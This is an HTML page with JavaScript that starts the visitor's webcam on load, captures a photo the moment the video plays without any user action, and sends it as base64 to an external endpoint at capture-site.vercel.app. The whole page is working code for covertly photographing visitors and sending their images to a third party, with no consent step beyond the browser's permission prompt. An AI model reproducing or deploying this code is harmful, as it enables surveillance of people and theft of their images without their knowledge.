<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Photo Automatically</title>
</head>
<body>
    <h1>Capture Photo Automatically and Send to Email</h1>
    
    <!-- Video Stream Display -->
    <video id="video" width="640" height="480" autoplay></video>

    <script>
        // Get access to the webcam
        const video = document.getElementById('video');
        let photoBase64 = '';

        // Start the webcam stream
        async function startWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                // Automatically capture photo when the video starts
                video.onplaying = async () => {
                    capturePhoto();
                    await sendPhoto(); // Automatically send the captured photo
                };
            } catch (err) {
                console.error("Error accessing webcam: ", err);
            }
        }

        // Capture the photo automatically
        function capturePhoto() {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);


            // Convert to base64
            photoBase64 = canvas.toDataURL('image/jpeg');
            console.log('Captured Photo:', photoBase64); // Log for debugging
        }

        // Send photo to the backend
        async function sendPhoto() {
            if (!photoBase64) {
                alert('No photo captured yet.');
                return;
            }

            try {
                console.log('Sending photo data:', photoBase64);

                const response = await fetch('https://capture-site.vercel.app/api/send-photo', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ photo: photoBase64 }), // Send base64 photo
                });

                const result = await response.json();
                console.log(result);
                alert(result.message || 'Something went wrong');
            } catch (error) {
                console.error('Error sending photo:', error);
                alert('Failed to send the photo');
            }
        }

        // Start webcam on page load
        startWebcam();
    </script>
</body>
</html>
